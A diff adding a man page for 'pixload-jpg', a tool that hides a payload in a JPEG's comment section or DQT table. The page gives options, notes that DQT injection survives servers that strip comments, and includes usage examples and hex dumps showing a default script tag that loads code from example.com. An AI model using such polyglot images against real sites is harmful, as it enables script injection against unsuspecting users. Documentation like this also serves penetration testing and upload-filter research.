@@ -1,0 +1,134 @@
+=pod
+
+=encoding UTF-8
+
+=head1 NAME
+
+pixload-jpg - hide payload/malicious code in JPEG images
+
+=head1 SYNOPSIS
+
+B<pixload-jpg> [I<OPTION>]... I<FILE>
+
+=head1 DESCRIPTION
+
+B<pixload-jpg> creates a JPEG Image with payload, or injects payload into
+existing image.
+
+The payload can be injected into I<COMMENT> section or I<DQT> table.
+
+=head1 OPTIONS
+
+Mandatory arguments to long options are mandatory for short options too.
+
+=over 8
+
+=item B<-S>, B<--section> I<COM>|I<DQT>
+
+Inject payload into I<COM>MENT section or I<DQT> table.
+
+In case if payload is injected into I<COM>MENT section, if the output I<FILE>
+exists, then payload will be injected into the existing file. Otherwise, the
+new one will be created.
+
+In case if payload is injected into I<DQT> table, the output I<FILE> will be
+overwritten. Also, note that I<DQT> injecting has a few limitations:
+
+=over 8
+
+=item 1
+
+Payload size must not exceed 64 bytes.
+
+=item 2
+
+As mentioned above, there is no injection support into existing file: the
+new I<FILE> will be created.
+
+=back
+
+I<DQT> injection must come in handy in case when the server application
+processes images and removes comments, application-specific data, etc.
+
+Default is I<COM>.
+
+=item B<-P>, B<--payload> I<STRING>
+
+Set payload for injection. Default is C<< <script src=//example.com></script> >>.
+
+=item B<-v>, B<--version>
+
+Print version and exit.
+
+=item B<-h>, B<--help>
+
+Print help and exit.
+
+=back
+
+=head1 EXAMPLES
+
+=head2 Inject payload into I<COM> section
+
+  $ pixload-jpg -S com payload.jpg
+  ........ JPEG Payload Creator/Injector ........
+  ...............................................
+  ... https://github.com/chinarulezzz/pixload ...
+  ...............................................
+
+  [>] Generating output file
+  [✔] File saved to: payload.jpg
+
+  [>] Injecting payload into COMMENT
+  [✔] Payload was injected successfully
+
+  payload.jpg: JPEG image data, progressive, precision 8, 1x1, components 1
+
+  00000000  ff d8 ff fe 00 25 3c 73  63 72 69 70 74 20 73 72  |.....%<script sr|
+  00000010  63 3d 2f 2f 65 78 61 6d  70 6c 65 2e 63 6f 6d 3e  |c=//example.com>|
+  00000020  3c 2f 73 63 72 69 70 74  3e ff db 00 43 00 01 01  |</script>...C...|
+  00000030  01 01 01 01 01 01 01 01  01 01 01 01 01 01 01 01  |................|
+  *
+  00000060  01 01 01 01 01 01 01 01  01 01 01 01 01 01 ff c2  |................|
+  00000070  00 0b 08 00 01 00 01 01  01 11 00 ff c4 00 14 00  |................|
+  00000080  01 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+  00000090  03 ff da 00 08 01 01 00  00 00 01 3f ff d9        |...........?..|
+  0000009e
+
+=head2 Inject payload into I<DQT> table
+
+  $ pixload-jpg -S dqt payload.jpg
+  ........ JPEG Payload Creator/Injector ........
+  ...............................................
+  ... https://github.com/chinarulezzz/pixload ...
+  ...............................................
+
+  [>] Generating output file
+  [✔] File saved to: payload.jpg
+
+  [>] Generating output file
+  [✔] File saved to: payload.jpg
+
+  [>] Injecting payload into DQT table
+  [✔] Payload was injected succesfully
+
+  payload.jpg: JPEG image data, progressive, precision 8, 1x1, components 1
+
+  00000000  ff d8 ff db 00 43 00 01  01 01 01 01 01 01 01 01  |.....C..........|
+  00000010  01 01 01 01 01 01 01 01  01 01 01 01 01 01 01 01  |................|
+  00000020  01 01 01 01 3c 73 63 72  69 70 74 20 73 72 63 3d  |....<script src=|
+  00000030  2f 2f 65 78 61 6d 70 6c  65 2e 63 6f 6d 3e 3c 2f  |//example.com></|
+  00000040  73 63 72 69 70 74 3e ff  c2 00 0b 08 00 01 00 01  |script>.........|
+  00000050  01 01 11 00 ff c4 00 14  00 01 00 00 00 00 00 00  |................|
+  00000060  00 00 00 00 00 00 00 00  00 03 ff da 00 08 01 01  |................|
+  00000070  00 00 00 01 3f ff d9                              |....?..|
+  00000077
+
+=head1 SEE ALSO
+
+L<pixload-bmp(1)|https://github.com/chinarulezzz/pixload/blob/master/pixload-bmp.1.pod>,
+L<pixload-gif(1)|https://github.com/chinarulezzz/pixload/blob/master/pixload-gif.1.pod>,
+L<pixload-png(1)|https://github.com/chinarulezzz/pixload/blob/master/pixload-png.1.pod>,
+L<pixload-webp(1)|https://github.com/chinarulezzz/pixload/blob/master/pixload-webp.1.pod>
+
+=cut
